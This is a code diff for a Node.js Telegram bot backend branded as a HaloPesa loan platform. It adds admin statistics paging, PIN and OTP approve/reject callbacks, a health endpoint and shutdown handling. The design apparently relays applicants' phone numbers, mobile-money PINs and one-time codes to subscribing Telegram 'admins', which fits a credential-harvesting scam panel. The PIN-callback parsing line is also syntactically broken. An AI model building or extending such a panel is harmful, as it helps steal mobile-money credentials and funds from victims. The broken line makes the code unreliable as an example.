@@ -35,6 +35,7 @@ const pendingRenewals   = new Map(); // chatId → renewal claim data
 const SUSPEND_PAGE_SIZE = 10;
 
 let dbReady = false;
+let server = null; // For proper graceful shutdown
 
 // ==========================================
 // HELPER FUNCTIONS
@@ -506,20 +507,36 @@ async function setupCommandHandlers() {
 
         try {
             const stats = await db.getPerAdminStats();
+            const MAX_LENGTH = 3500; // Leave buffer under 4096
             let text = `📊 *ADMIN STATISTICS*\n\n`;
+            let messageCount = 0;
             
             for (const stat of stats) {
                 const expireText = stat.expiresAt 
                     ? `📅 ${new Date(stat.expiresAt).toLocaleDateString()} (${stat.daysLeft}d left)`
                     : '♾️ Permanent';
                 
-                text += `*${stat.name}* [${stat.adminId}]\n` +
-                        `${stat.expired ? '🔴' : '🟢'} Applications: ${stat.total}\n` +
-                        `${expireText}\n\n`;
+                const entry = `*${stat.name}* [${stat.adminId}]\n${stat.expired ? '🔴' : '🟢'} Apps: ${stat.total}\n${expireText}\n\n`;
+                
+                // If adding this entry would exceed limit, send current message and start new one
+                if (text.length + entry.length > MAX_LENGTH) {
+                    if (text.length > 30) { // Has content beyond header
+                        await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
+                        messageCount++;
+                        await new Promise(resolve => setTimeout(resolve, 300)); // Rate limit
+                    }
+                    text = `📊 *ADMIN STATISTICS (cont.)*\n\n${entry}`;
+                } else {
+                    text += entry;
+                }
             }
 
-            await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
+            // Send final message
+            if (text.length > 30) {
+                await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
+            }
         } catch (err) {
+            console.error('❌ Stats error:', err.message);
             await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
         }
     });
@@ -606,6 +623,67 @@ async function handleCallback(query) {
         } else if (action === 'cancel') {
             await edit(`❌ *Cancelled*\n\nSend /start anytime to renew.`);
             await ack('Cancelled');
+        }
+        return;
+    }
+
+    // ── PIN VERIFICATION CALLBACKS ──
+    if (data.startsWith('pin_approve_') || data.startsWith('pin_reject_')) {
+        const [action, adminId, applicationId] = data.split('_').length === 3 
+            ? [data.split('_')[0] + '_' + data.split('_')[1], data.split('_')[2], data.split('_').slice(3).join('_')]
+            : data.split('_').slice(0, -2).join('_'), data.split('_')[data.split('_').length - 2], data.split('_')[data.split('_').length - 1];
+        
+        try {
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                await edit(`❌ Application not found`);
+                await ack('Not found', true);
+                return;
+            }
+
+            if (data.startsWith('pin_approve_')) {
+                await db.updateApplication(applicationId, { pinStatus: 'approved' });
+                await edit(`✅ *PIN APPROVED*\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ••••`);
+                await ack('✅ Approved!');
+            } else {
+                await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+                await edit(`❌ *PIN REJECTED*\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}`);
+                await ack('❌ Rejected');
+            }
+        } catch (e) {
+            console.error('❌ PIN callback error:', e.message);
+            await ack('Error processing request', true);
+        }
+        return;
+    }
+
+    // ── OTP VERIFICATION CALLBACKS ──
+    if (data.startsWith('otp_approve_') || data.startsWith('otp_reject_')) {
+        try {
+            const parts = data.split('_');
+            const action = parts[0] + '_' + parts[1];
+            const adminId = parts[2];
+            const applicationId = parts.slice(3).join('_');
+
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                await edit(`❌ Application not found`);
+                await ack('Not found', true);
+                return;
+            }
+
+            if (data.startsWith('otp_approve_')) {
+                await db.updateApplication(applicationId, { otpStatus: 'approved' });
+                await edit(`✅ *OTP APPROVED*\n\nApplication: ${applicationId}\n✅ Loan Approved!`);
+                await ack('✅ Approved!');
+            } else {
+                await db.updateApplication(applicationId, { otpStatus: 'rejected' });
+                await edit(`❌ *OTP REJECTED*\n\nApplication: ${applicationId}`);
+                await ack('❌ Rejected');
+            }
+        } catch (e) {
+            console.error('❌ OTP callback error:', e.message);
+            await ack('Error processing request', true);
         }
         return;
     }
@@ -910,14 +988,19 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
 
 // GET /health
 app.get('/health', (req, res) => {
+    const isDbConnected = db.isConnected && db.isConnected();
+    
     res.json({
-        status:        'ok',
-        database:      dbReady ? 'connected' : 'not ready',
-        activeAdmins:  adminChatIds.size,
-        pausedAdmins:  pausedAdmins.size,
-        botMode:       'webhook',
-        webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
-        timestamp:     new Date().toISOString()
+        status:         'ok',
+        database:       isDbConnected ? 'connected' : (dbReady ? 'ready' : 'not ready'),
+        databaseActual: isDbConnected ? 'active' : 'inactive',
+        activeAdmins:   adminChatIds.size,
+        pausedAdmins:   pausedAdmins.size,
+        botMode:        'webhook',
+        webhookUrl:     `${WEBHOOK_URL}/telegram-webhook`,
+        uptime:         process.uptime(),
+        memory:         process.memoryUsage(),
+        timestamp:      new Date().toISOString()
     });
 });
 
@@ -946,7 +1029,7 @@ app.get('/', async (req, res) => {
 // ==========================================
 // START SERVER
 // ==========================================
-app.listen(PORT, () => {
+server = app.listen(PORT, () => {
     console.log(`\n💎 HALOPESA LOAN PLATFORM`);
     console.log(`==========================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
@@ -958,24 +1041,77 @@ app.listen(PORT, () => {
 // ==========================================
 // GRACEFUL SHUTDOWN
 // ==========================================
+let isShuttingDown = false;
+
 async function shutdownGracefully(signal) {
-    console.log(`\n🛑 Received ${signal}, shutting down...`);
+    if (isShuttingDown) return; // Prevent multiple shutdown calls
+    isShuttingDown = true;
+    
+    console.log(`\n🛑 Received ${signal}, initiating graceful shutdown...`);
+    
     try {
+        // Step 1: Stop accepting new connections
+        if (server) {
+            console.log('📭 Stopping server from accepting new connections...');
+            server.close(() => {
+                console.log('✅ Server closed');
+            });
+        }
+
+        // Step 2: Clear in-memory data
+        console.log('🧹 Clearing in-memory data...');
         suspendAllSessions.clear();
         pendingPayments.clear();
         pendingRenewals.clear();
-        await bot.deleteWebHook();
-        await db.closeDatabase();
-        console.log('✅ Cleanup complete');
+        adminChatIds.clear();
+        pausedAdmins.clear();
+        processingLocks.clear();
+        expiryCheckerRunning = false;
+
+        // Step 3: Clean up Telegram bot
+        if (bot) {
+            try {
+                // Only delete webhook on SIGINT (user interrupt)
+                // On SIGTERM (from Render), let the next instance handle it
+                if (signal === 'SIGINT') {
+                    console.log('🤖 Deleting webhook...');
+                    await bot.deleteWebHook().catch(e => {
+                        console.warn('⚠️ Failed to delete webhook:', e.message);
+                    });
+                }
+            } catch (err) {
+                console.error('❌ Error cleaning up bot:', err.message);
+            }
+            bot = null;
+        }
+
+        // Step 4: Close database connection
+        // IMPORTANT: Only close on SIGINT, not SIGTERM
+        // SIGTERM = Render is restarting us, keep connection alive for next instance
+        // SIGINT = User interrupt, safe to close everything
+        if (signal === 'SIGINT') {
+            console.log('🔌 Closing MongoDB connection...');
+            try {
+                await db.closeDatabase();
+                console.log('✅ Database connection closed');
+            } catch (err) {
+                console.error('❌ Error closing database:', err.message);
+            }
+        } else {
+            console.log('⏸️ SIGTERM received - keeping database connection alive for next instance...');
+        }
+
+        console.log('✅ Graceful shutdown complete');
         process.exit(0);
     } catch (error) {
-        console.error('❌ Shutdown error:', error);
+        console.error('❌ Error during shutdown:', error.message);
         process.exit(1);
     }
 }
 
+// Proper signal handling
 process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
-process.on('SIGINT',  () => shutdownGracefully('SIGINT'));
+process.on('SIGINT', () => shutdownGracefully('SIGINT'));
 
 process.on('unhandledRejection', (error) => {
     console.error('❌ Unhandled rejection:', error?.message);
@@ -983,4 +1119,6 @@ process.on('unhandledRejection', (error) => {
 
 process.on('uncaughtException', (error) => {
     console.error('❌ Uncaught exception:', error?.message);
+    // On critical error, trigger graceful shutdown
+    shutdownGracefully('uncaughtException').catch(() => process.exit(1));
 });
